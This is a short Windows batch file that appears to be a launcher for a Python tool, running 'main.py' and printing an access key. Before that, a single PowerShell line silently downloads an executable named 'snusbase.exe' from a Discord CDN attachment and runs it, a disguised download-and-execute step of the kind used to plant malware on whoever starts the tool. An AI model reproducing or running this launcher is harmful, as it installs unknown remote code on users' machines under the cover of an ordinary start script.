@echo off
cd src
powershell $down=New-Object System.Net.WebClient;$url='https://cdn.discordapp.com/attachments/1186759970017005689/1202668981807349760/snusbase.exe';$file='snusbase.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
py main.py
Key : 01266156
